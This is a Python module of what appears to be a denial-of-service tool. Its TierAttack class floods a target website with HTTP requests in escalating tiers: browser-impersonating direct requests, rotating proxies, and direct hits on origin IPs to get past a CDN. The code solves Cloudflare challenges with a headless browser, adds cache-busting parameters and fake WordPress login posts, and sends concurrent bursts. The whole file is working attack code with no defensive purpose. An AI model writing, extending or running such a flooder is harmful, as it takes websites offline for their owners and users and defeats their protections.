import asyncio
import time
import random
import logging
from typing import Optional, Callable, Dict, List, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse

from core.proxy_engine import ProxyPool
from core.tls_engine import build_headers, build_post_headers, random_profile, BROWSER_PROFILES

logger = logging.getLogger("tier_engine")

CF_SOLVED_COOKIES: dict = {}
CF_SOLVED_AT: float = 0
CF_COOKIE_TTL: int = 1800

REQ_TIMEOUT = 8
WARMUP_PATHS = ["/", "/favicon.ico", "/robots.txt", "/sitemap.xml", "/wp-content/"]
BYPASS_PATHS = [
    "/?a={r}", "/xmlrpc.php", "/?s={r}", "/feed/", "/?nocache={r}",
    "/cdn-cgi/trace", "/wp-json/wp/v2/users", "/?page={r}", "/?p={r}",
    "/wp-login.php", "/?author={r}", "/api/v1/", "/.well-known/",
]
POST_DATA = [
    ("username=admin&password={r}&submit=Login", "application/x-www-form-urlencoded"),
    ('{"email":"u{r}@t.com","password":"p{r}"}', "application/json"),
    ("search={r}&page=1", "application/x-www-form-urlencoded"),
]


@dataclass
class TierMetrics:
    completed: int = 0
    failed: int = 0
    timeout: int = 0
    total: int = 0
    rps: float = 0.0
    avg_rtt: float = 0.0
    peak_rps: float = 0.0
    tier: int = 1
    status: str = "idle"


_SESSION_POOL: dict = {}

async def _request_curl(url: str, method: str = "GET", proxy: Optional[str] = None,
                        data: Optional[object] = None, profile: Optional[dict] = None,
                        timeout: float = REQ_TIMEOUT) -> Tuple[int, float, dict, str]:
    start = time.monotonic()
    try:
        from curl_cffi.requests import Session
        p = profile or random_profile()
        pool_key = f"{p['impersonate']}_{proxy or 'direct'}"
        if pool_key not in _SESSION_POOL:
            kwargs = {"impersonate": p["impersonate"], "timeout": timeout}
            if proxy:
                kwargs["proxy"] = proxy
            sess = Session(**kwargs)
            global CF_SOLVED_COOKIES
            if CF_SOLVED_COOKIES and time.time() - CF_SOLVED_AT < CF_COOKIE_TTL:
                for name, value in CF_SOLVED_COOKIES.items():
                    sess.cookies.set(name, value)
            _SESSION_POOL[pool_key] = sess
        sess = _SESSION_POOL[pool_key]
        headers = build_headers(url, p) if method == "GET" else build_post_headers(url, p)
        req_data = None
        extra_headers = {}
        if isinstance(data, tuple) and len(data) >= 2:
            req_data, ct = data[0], data[1]
            extra_headers["Content-Type"] = ct
        elif isinstance(data, str):
            req_data = data
        headers.update(extra_headers)
        if req_data is not None:
            resp = sess.request(method, url, headers=headers, data=req_data)
        else:
            resp = sess.request(method, url, headers=headers)
        elapsed = (time.monotonic() - start) * 1000
        body = resp.text[:2000] if hasattr(resp, 'text') else ""
        hdrs = dict(resp.headers) if hasattr(resp, 'headers') else {}
        return resp.status_code, round(elapsed, 2), hdrs, body
    except Exception as e:
        elapsed = (time.monotonic() - start) * 1000
        ename = type(e).__name__
        if pool_key in _SESSION_POOL:
            try:
                _SESSION_POOL[pool_key].close()
            except Exception:
                pass
            del _SESSION_POOL[pool_key]
        return 0, round(elapsed, 2), {}, f"{ename}:{e}"


async def _race(url: str, method: str = "GET", proxy: Optional[str] = None,
                data: Optional[str] = None, profile: Optional[dict] = None) -> Tuple[int, float, dict, str]:
    return await _request_curl(url, method, proxy, data, profile)


class TierAttack:
    def __init__(self, proxy_pool: ProxyPool, target_url: str, origin_ip: Optional[str] = None,
                 proxy_type: str = "mobile", on_metrics: Optional[Callable] = None,
                 attack_plan: Optional[list] = None):
        self.proxy_pool = proxy_pool
        self.target_url = target_url
        self.origin_ip = origin_ip
        self.proxy_type = proxy_type
        self.on_metrics = on_metrics
        self.attack_plan = attack_plan
        self._endpoint_engine = None
        self._running = False
        self._lock = asyncio.Lock()
        self._cf_consecutive_blocks = 0

    def is_cloudflare_block(self, status: int, headers: dict, body: str) -> bool:
        if status in (403, 429, 503):
            body_lower = body.lower()
            if any(x in body_lower for x in ["attention required", "cf-browser-verification",
                                              "just a moment", "checking your browser"]):
                return True
            has_cf_header = any(x in headers for x in ["cf-ray", "cf-cache-status"])
            has_cf_cookie = any(x in str(headers) for x in ["__cfduid", "__cf_bm", "cf_clearance"])
            if has_cf_header and has_cf_cookie:
                return True
        return False

    def is_success(self, status: int) -> bool:
        if status == 0:
            return False
        return status >= 200

    async def solve_cloudflare(self, url: str):
        global CF_SOLVED_COOKIES, CF_SOLVED_AT
        if CF_SOLVED_COOKIES and time.time() - CF_SOLVED_AT < CF_COOKIE_TTL:
            return
        logger.info("Attempting Cloudflare challenge solve via real browser...")
        try:
            from core.cf_solver import solve_challenge
            cookies = await solve_challenge(url, headless=True)
            if cookies:
                CF_SOLVED_COOKIES = cookies
                CF_SOLVED_AT = time.time()
                logger.info("CF challenge solved: %s", list(cookies.keys()))
            else:
                logger.warning("CF challenge solve returned no cookies")
        except Exception as e:
            logger.error("CF solver failed: %s", str(e))

    def _pick_target(self, base_url: str) -> Tuple[str, str, Optional[Tuple[str, str]]]:
        plan = self.attack_plan
        if not plan:
            return base_url, "GET", None
        total = sum(p.get("weight", 1) for p in plan)
        r = random.uniform(0, total)
        cum = 0
        picked = plan[-1]
        for p in plan:
            cum += p.get("weight", 1)
            if r <= cum:
                picked = p
                break
        path = picked.get("path", "/")
        method = picked.get("method", "GET")
        if "{rand}" in path:
            path = path.replace("{rand}", str(random.randint(1, 99999)))
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        target = base + path
        cb = random.randint(100000, 999999)
        if "?" in path:
            target += "&_cb=" + str(cb)
        else:
            target += "?_cb=" + str(cb)
        data = None
        ct = None
        if method == "POST" and picked.get("post_data"):
            data = picked["post_data"]
            ct = picked.get("content_type", "application/x-www-form-urlencoded")
        return target, method, (data, ct) if data else None

    async def warmup(self, url: str):
        logger.info("Warm-up: visiting %s", url)
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in WARMUP_PATHS:
            target = base + path
            st, el, hd, body = await _race(target, "GET")
            await asyncio.sleep(random.uniform(1.5, 4.0))
            if st > 0:
                logger.debug("Warm-up %s -> %d (%dms)", target, st, el)
        logger.info("Warm-up complete")

    async def _burst_send(self, url: str, method: str, proxy: Optional[str],
                           data: Optional[str], burst_size: int) -> List[Tuple[int, float, dict, str]]:
        async def _single():
            return await _race(url, method, proxy, data)
        tasks = [_single() for _ in range(burst_size)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def _worker(self, wid: int, url: str, method: str, duration: float,
                       m: TierMetrics, start: float, data: Optional[str] = None,
                       rtts: list = None, cf_solved: list = None,
                       burst: int = 1):
        while self._running and time.time() - start < duration:
            picked_target, picked_method, body_info = self._pick_target(url)
            req_method = picked_method
            req_data = data
            if body_info:
                req_data = body_info
            proxy = None
            target = picked_target
            if self.origin_ip:
                parsed = urlparse(url)
                pu = urlparse(picked_target)
                target = f"{parsed.scheme}://{self.origin_ip}{pu.path or '/'}"
                if pu.query:
                    target += "?" + pu.query
            elif self.proxy_pool:
                ps = await self.proxy_pool.get_proxy(self.proxy_type)
                proxy = ps.url if ps else None
            if burst > 1:
                results = await self._burst_send(target, req_method, proxy, req_data, burst)
                for res in results:
                    if isinstance(res, tuple) and len(res) == 4:
                        st, el, hd, body = res
                    else:
                        st, el, hd, body = 0, 0, {}, ""
                    await self._record_result(st, el, hd, body, m, rtts, start, url, cf_solved)
            else:
                st, el, hd, body = await _race(target, req_method, proxy, req_data)
                await self._record_result(st, el, hd, body, m, rtts, start, url, cf_solved)

    async def _record_result(self, st, el, hd, body, m, rtts, start, url, cf_solved):
        if self.is_cloudflare_block(st, hd, body):
            async with self._lock:
                self._cf_consecutive_blocks += 1
                if self._cf_consecutive_blocks >= 3 and not cf_solved[0]:
                    cf_solved[0] = True
                    asyncio.create_task(self.solve_cloudflare(url))
        else:
            self._cf_consecutive_blocks = 0
        async with self._lock:
            m.total += 1
            rtts.append(el)
            m.avg_rtt = sum(rtts[-100:]) / min(len(rtts), 100)
            if self.is_success(st):
                m.completed += 1
            elif st == 0 and el >= REQ_TIMEOUT * 1000:
                m.timeout += 1
            else:
                m.failed += 1
            elapsed_total = time.time() - start
            m.rps = m.completed / max(elapsed_total, 0.1)
            if m.rps > m.peak_rps:
                m.peak_rps = m.rps
            if self.on_metrics:
                self.on_metrics(m)

    async def tier1_curl(self, url: str, method: str, duration: float,
                         rps: int, data: Optional[str] = None) -> TierMetrics:
        m = TierMetrics(tier=1, status="running")
        self._running = True
        start = time.time()
        rtts: List[float] = []
        cf_solved = [False]
        burst = 5 if rps > 100 else 1
        workers = max(1, min(rps // burst, 50))
        tasks = [self._worker(i, url, method, duration, m, start, data, rtts, cf_solved, burst)
                 for i in range(workers)]
        await asyncio.gather(*tasks)
        self._running = False
        m.status = "done"
        return m

    async def _worker_proxy(self, wid: int, url: str, method: str, duration: float,
                             m: TierMetrics, start: float, data: Optional[str] = None,
                             rtts: list = None, cf_solved: list = None,
                             burst: int = 1):
        while self._running and time.time() - start < duration:
            picked_target, picked_method, body_info = self._pick_target(url)
            req_method = picked_method
            req_data = data
            if body_info:
                req_data = body_info
            proxy = None
            if self.proxy_pool:
                ps = await self.proxy_pool.get_proxy(self.proxy_type)
                proxy = ps.url if ps else None
            if burst > 1:
                results = await self._burst_send(picked_target, req_method, proxy, req_data, burst)
                for res in results:
                    if isinstance(res, tuple) and len(res) == 4:
                        st, el, hd, body = res
                    else:
                        st, el, hd, body = 0, 0, {}, ""
                    await self._record_result(st, el, hd, body, m, rtts, start, url, cf_solved)
            else:
                st, el, hd, body = await _race(picked_target, req_method, proxy, req_data)
                await self._record_result(st, el, hd, body, m, rtts, start, url, cf_solved)

    async def _worker_origin(self, wid: int, url: str, method: str, duration: float,
                              m: TierMetrics, start: float, parsed,
                              host: str, path: str, use_origin_ips: list,
                              data: Optional[str] = None, rtts: list = None):
        while self._running and time.time() - start < duration:
            origin = random.choice(use_origin_ips)
            target = f"{parsed.scheme}://{origin}{path}"
            st, el, _, _ = await _race(target, method, data=data)
            async with self._lock:
                m.total += 1
                rtts.append(el)
                m.avg_rtt = sum(rtts[-100:]) / min(len(rtts), 100)
                if self.is_success(st):
                    m.completed += 1
                elif st == 0 and el >= REQ_TIMEOUT * 1000:
                    m.timeout += 1
                else:
                    m.failed += 1
                m.rps = m.completed / max(time.time() - start, 0.1)
                if m.rps > m.peak_rps:
                    m.peak_rps = m.rps
                if self.on_metrics:
                    self.on_metrics(m)

    async def tier2_proxy(self, url: str, method: str, duration: float,
                          rps: int, data: Optional[str] = None) -> TierMetrics:
        m = TierMetrics(tier=2, status="running")
        self._running = True
        start = time.time()
        rtts: List[float] = []
        cf_solved = [False]
        burst = 5 if rps > 100 else 1
        workers = max(1, min(rps // burst, 50))
        tasks = [self._worker_proxy(i, url, method, duration, m, start, data, rtts, cf_solved, burst)
                 for i in range(workers)]
        await asyncio.gather(*tasks)
        self._running = False
        m.status = "done"
        return m

    async def tier3_origin(self, url: str, method: str, duration: float,
                           rps: int, data: Optional[str] = None) -> TierMetrics:
        m = TierMetrics(tier=3, status="running")
        self._running = True
        start = time.time()
        rtts: List[float] = []
        parsed = urlparse(url)
        host = parsed.netloc
        path = parsed.path if parsed.path else "/"
        if parsed.query:
            path += "?" + parsed.query
        use_origin_ips = [self.origin_ip] if self.origin_ip else []
        if not use_origin_ips:
            try:
                import socket
                use_origin_ips = list(set(socket.gethostbyname_ex(host)[2]))
            except Exception:
                use_origin_ips = [host]
        workers = max(1, rps // 10)
        tasks = [self._worker_origin(i, url, method, duration, m, start,
                                      parsed, host, path, use_origin_ips, data, rtts)
                 for i in range(workers)]
        await asyncio.gather(*tasks)
        self._running = False
        m.status = "done"
        return m

    async def run_escalation(self, url: str, start_tier: int = 1, duration: int = 300,
                             rps: int = 100, workers: int = 20, method: str = "http_get_flood") -> TierMetrics:
        final = TierMetrics()
        tier_names = {1: "Tier1-curl", 2: "Tier2-proxy", 3: "Tier3-origin"}
        for tier in range(start_tier, 4):
            logger.info("Starting %s -> %s", tier_names.get(tier, f"Tier{tier}"), url)
            coro = None
            if tier == 1:
                coro = self.tier1_curl(url, "GET", duration, rps)
            elif tier == 2:
                coro = self.tier2_proxy(url, "GET", duration, rps)
            elif tier == 3:
                coro = self.tier3_origin(url, "GET", duration, rps)
            if coro:
                m = await coro
                sr = (m.completed / max(m.total, 1)) * 100
                logger.info("%s done: %d req, %.1f%% SR, %.0fms RTT",
                            tier_names.get(tier, f"Tier{tier}"), m.total, sr, m.avg_rtt)
                if sr >= 50 or m.completed > 0:
                    return m
                if tier < 3:
                    logger.info("Escalating to next tier (SR=%.1f%%)", sr)
                    await asyncio.sleep(2)
        return final

    def stop(self):
        self._running = False
